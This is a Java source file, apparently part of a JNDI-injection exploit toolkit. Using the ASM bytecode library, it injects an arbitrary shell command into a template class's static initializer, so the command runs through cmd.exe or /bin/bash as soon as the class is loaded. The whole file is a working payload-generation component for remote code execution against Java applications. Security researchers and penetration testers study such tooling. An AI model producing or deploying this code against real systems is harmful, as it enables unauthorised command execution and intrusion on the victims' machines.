package util;

import java.io.InputStream;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;


/**
 * @Classname Transformers
 * @Description Insert command to the template classfile
 * @Author Welkin
 * @Author pimps
 */
public class Transformers {

    public static byte[] insertCommand(InputStream inputStream, String command) throws Exception{

        ClassReader cr = new ClassReader(inputStream);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        ClassVisitor cv = new TransformClass(cw,command);

        cr.accept(cv, 2);
        return cw.toByteArray();
    }

    static class TransformClass extends ClassVisitor{

        String command;

        TransformClass(ClassVisitor classVisitor, String command){
            super(Opcodes.ASM7,classVisitor);
            this.command = command;
        }

        @Override
        public MethodVisitor visitMethod(
                final int access,
                final String name,
                final String descriptor,
                final String signature,
                final String[] exceptions) {
            MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
            if(name.equals("<clinit>")){
                return new TransformMethod(mv, command);
            }else{
                return mv;
            }
        }
    }

    static class TransformMethod extends MethodVisitor{

        String command;

        TransformMethod(MethodVisitor methodVisitor, String command) {
            super(Opcodes.ASM7, methodVisitor);
            this.command = command;
        }

        @SuppressWarnings("deprecation")
		@Override
        public void visitCode(){
/*
  		The following java instructions is the "ASMified" java code:
            
            	String[] cmd;
				if (java.lang.System.getProperty("os.name").toLowerCase().contains("win")) {
					cmd = new String[] { "cmd.exe", "/C", command };
				} else {
					cmd = new String[] { "/bin/bash", "-c", command };
				}
				try {
					Runtime.getRuntime().exec(cmd);
				} catch (Exception e) {
					e.printStackTrace();
				}
				
		With this approach we can have a dynamic generated java code across multiple
		versions of the JDK using a simple compiled template.
*/
        	
        	Label l0 = new Label();
        	Label l1 = new Label();
        	Label l2 = new Label();
        	mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
        	Label l3 = new Label();
        	mv.visitLabel(l3);
        	mv.visitLineNumber(1, l3);
        	mv.visitLdcInsn("os.name");
        	mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;");
        	mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "toLowerCase", "()Ljava/lang/String;");
        	mv.visitLdcInsn("win");
        	mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z");
        	Label l4 = new Label();
        	mv.visitJumpInsn(Opcodes.IFEQ, l4);
        	mv.visitInsn(Opcodes.ICONST_3);
        	mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_0);
        	mv.visitLdcInsn("cmd.exe");
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_1);
        	mv.visitLdcInsn("/C");
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_2);
        	mv.visitLdcInsn(command);
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitVarInsn(Opcodes.ASTORE, 0);
        	Label l5 = new Label();
        	mv.visitLabel(l5);
        	mv.visitJumpInsn(Opcodes.GOTO, l0);
        	mv.visitLabel(l4);
        	mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
        	mv.visitInsn(Opcodes.ICONST_3);
        	mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_0);
        	mv.visitLdcInsn("/bin/bash");
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_1);
        	mv.visitLdcInsn("-c");
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitInsn(Opcodes.DUP);
        	mv.visitInsn(Opcodes.ICONST_2);
        	mv.visitLdcInsn(command);
        	mv.visitInsn(Opcodes.AASTORE);
        	mv.visitVarInsn(Opcodes.ASTORE, 0);
        	mv.visitLabel(l0);
        	mv.visitFrame(Opcodes.F_APPEND,1, new Object[] {"[Ljava/lang/String;"}, 0, null);
        	mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;");
        	mv.visitVarInsn(Opcodes.ALOAD, 0);
        	mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;");
        	mv.visitInsn(Opcodes.POP);
        	mv.visitLabel(l1);
        	Label l6 = new Label();
        	mv.visitJumpInsn(Opcodes.GOTO, l6);
        	mv.visitLabel(l2);
        	mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/Exception"});
        	mv.visitVarInsn(Opcodes.ASTORE, 1);
        	Label l7 = new Label();
        	mv.visitLabel(l7);
        	mv.visitVarInsn(Opcodes.ALOAD, 1);
        	mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V");
        	mv.visitLabel(l6);
        }
    }

}
